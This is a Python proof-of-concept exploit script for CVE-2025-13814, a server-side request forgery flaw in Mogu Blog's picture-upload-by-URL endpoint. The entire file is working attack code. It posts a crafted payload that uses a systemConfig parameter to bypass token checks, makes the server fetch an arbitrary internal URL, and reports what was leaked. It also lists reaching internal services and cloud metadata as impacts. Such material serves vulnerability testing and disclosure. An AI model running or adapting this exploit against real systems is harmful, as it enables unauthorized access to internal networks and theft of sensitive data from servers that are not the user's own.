#!/usr/bin/env python3
"""
CVE-2025-13814 - Mogu Blog SSRF PoC
Vulnerability: Server-Side Request Forgery in /file/uploadPicsByUrl
Bypass: Using systemConfig parameter to bypass token validation
"""

import requests
import sys
import json

def test_ssrf(target_url, ssrf_target="http://internal-service"):
    print("=" * 70)
    print("CVE-2025-13814 - Mogu Blog SSRF Vulnerability PoC")
    print("=" * 70)
    print(f"\nTarget: {target_url}")
    print("Endpoint: /file/uploadPicsByUrl")
    print("CWE: CWE-918 (Server-Side Request Forgery)\n")
    
    endpoint = f"{target_url}/file/uploadPicsByUrl"
    
    payload = {
        "adminUid": "test",
        "sortName": "admin",
        "projectName": "blog",
        "urlList": [ssrf_target],
        "systemConfig": {
            "uploadLocal": "1",
            "uploadQiNiu": "0",
            "uploadMinio": "0",
            "localPictureBaseUrl": "http://localhost:8600"
        }
    }
    
    print("[*] Sending SSRF payload...")
    print(f"    SSRF Target: {ssrf_target}")
    print("-" * 70)
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=30
        )
        
        print(f"Status Code: {response.status_code}")
        data = response.json()
        print(f"Response: {json.dumps(data, indent=2)}")
        
        if data.get('code') == 'success' and data.get('data'):
            file_info = data['data'][0]
            print("\n" + "=" * 70)
            print("[+] VULNERABLE! SSRF attack successful!")
            print("=" * 70)
            print(f"\nFile created: {file_info.get('picUrl')}")
            print(f"Original URL: {file_info.get('fileOldName')}")
            print("\nThe server made a request to the internal service and saved")
            print("the response as an image file. Check the file content to see")
            print("the leaked data from the internal service.")
            print("\nImpact:")
            print("  - Access internal services")
            print("  - Read sensitive data from internal network")
            print("  - Bypass firewall restrictions")
            print("  - Potential cloud metadata access")
            return True
        else:
            print("\n[-] Attack may have failed")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8602"
    ssrf_target = sys.argv[2] if len(sys.argv) > 2 else "http://internal-service"
    
    result = test_ssrf(target, ssrf_target)
    sys.exit(0 if result else 1)
